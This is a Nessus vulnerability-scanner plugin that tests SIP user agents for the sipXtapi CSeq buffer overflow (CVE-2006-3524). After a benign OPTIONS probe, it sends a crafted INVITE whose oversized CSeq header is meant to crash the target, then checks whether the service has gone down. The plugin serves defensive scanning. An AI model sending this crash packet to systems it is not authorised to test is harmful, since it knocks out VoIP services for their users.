#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22092);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2016/11/03 21:08:35 $");

  script_cve_id("CVE-2006-3524");
  script_bugtraq_id(18906);
  script_osvdb_id(27122);

  script_name(english:"sipXtapi INVITE Message CSeq Field Header Remote Overflow");
  script_summary(english:"Sends an SIP packet with a bad CSeq field");

  script_set_attribute(attribute:"synopsis", value:
"The remote host contains an application that is vulnerable to a remote
buffer overflow attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a SIP user agent that appears to be compiled
using a version of SIP Foundry's SipXtapi library before March 24, 2006. 
Such versions contain a buffer overflow flaw that is triggered when
processing a specially crafted packet with a long value for the 'CSeq'
field.  A remote attacker may be able to exploit this issue to execute
arbitrary code on the affected host subject to the privileges of the
current user.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/439617/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2006/Jul/161");
  script_set_attribute(attribute:"solution", value:"Contact the software vendor to see if an upgrade is available.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'SIPfoundry sipXphone 2.6.0.27 CSeq Buffer Overflow');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/07/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/07/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_end_attributes();

  script_category(ACT_DENIAL);
  script_family(english:"Misc.");
  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("sip_detection.nasl");
  script_require_ports("Services/udp/sip", "Services/sip");

  exit(0);
}

function try_dos(port, proto)
{
  local_var res, res2, soc, soc2, encaps, via_protocol, probe, sploit;

  if (proto == 'udp')
  {
    if (!get_udp_port_state(port)) return FALSE;
    if (islocalhost()) soc = open_sock_udp(port);
    else soc = open_priv_sock_udp(sport:port, dport:port);
  }
  else
  {
    if (!get_tcp_port_state(port)) return FALSE;
    soc = open_sock_tcp(port);
  }
  if (!soc) return FALSE;

  via_protocol = proto;

  encaps = get_port_transport(port);
  if (!isnull(encaps) && proto == 'tcp')
  {
    if (encaps && encaps > ENCAPS_IP)
      via_protocol = 'tls';
  }

  # Make sure the service is up.
  #
  # nb: this is what's used in sip_detection.nasl.
  probe =
    "OPTIONS sip:" + get_host_name() + " SIP/2.0" + '\r\n' +
    "Via: SIP/2.0/" + toupper(via_protocol) + " " + this_host() + ":" + port + '\r\n' +
    'Max-Forwards: 70\r\n' +
    "To: <sip:" + this_host() + ":" + port + '>\r\n' +
    "From: Nessus <sip:" + this_host() + ":" + port + '>\r\n' +
    "Call-ID: " + rand() + '\r\n' +
    'CSeq: 63104 OPTIONS\r\n' +
    "Contact: <sip:" + this_host() + '>\r\n' +
    'Accept: application/sdp\r\n' +
    'Content-Length: 0\r\n' +
    '\r\n';

  send(socket:soc, data:probe);
  res = recv(socket:soc, length:1024);

  if (!strlen(res) || isnull(res))
  {
    close(soc);
    return FALSE;
  }

  # http://en.wikipedia.org/wiki/List_of_SIP_response_codes
  if (!egrep(pattern:"^SIP/2\.0 [1-3][0-9][0-9] ", string:res))
  {
    close(soc);
    return FALSE;
  }

  # Try to crash the service.
  sploit =
    "INVITE sip:user@" + get_host_name() + " SIP/2.0" + '\r\n' +
    "To: <sip:" + this_host() + ":" + port + '>\r\n' +
    "Via: SIP/2.0/" + toupper(via_protocol) + " " + this_host() + ":" + port + '\r\n' +
    "From: Nessus <sip:" + this_host() + ":" + port + '>\r\n' +
    "Call-ID: " + rand() + '\r\n' +
    'CSeq: 115792089237316195423570AAAA\r\n' +
    'Max-Forwards: 70\r\n' +
    "Contact: <sip:" + this_host() + '>\r\n' +
    '\r\n';

  send(socket:soc, data:sploit);
  res = recv(socket:soc, length:1024);
  close(soc);

  if (!strlen(res) || isnull(res))
  {
    res2 = NULL;

    if (proto == 'udp')
    {
      if (islocalhost()) soc2 = open_sock_udp(port);
      else soc2 = open_priv_sock_udp(sport:port, dport:port);
    }
    else
    {
      soc2 = open_sock_tcp(port);
    }
    if (soc2)
    {
      send(socket:soc2, data:probe);
      res2 = recv(socket:soc2, length:1024);
      close(soc2);
    }
    # double check to make sure service is actually down
    if (!strlen(res2) || isnull(res2))
    {
      security_hole(port:port, proto:proto);
      return TRUE;
    }
  }
  return FALSE;
}

udp_ports = get_kb_list("Services/udp/sip");
tcp_ports = get_kb_list("Services/sip");

is_vuln = FALSE;

# loop through TCP ports
if (!isnull(tcp_ports))
{
  foreach port (make_list(tcp_ports))
  {
    if (try_dos(port:port, proto:"tcp")) is_vuln = TRUE;
  }
}

# loop through UDP ports
if (!isnull(udp_ports))
{
  foreach port (make_list(udp_ports))
  {
    if (try_dos(port:port, proto:"udp")) is_vuln = TRUE;
  }
}

if (!is_vuln) exit(0, "The remote SIP services are not vulnerable.");
else exit(0);
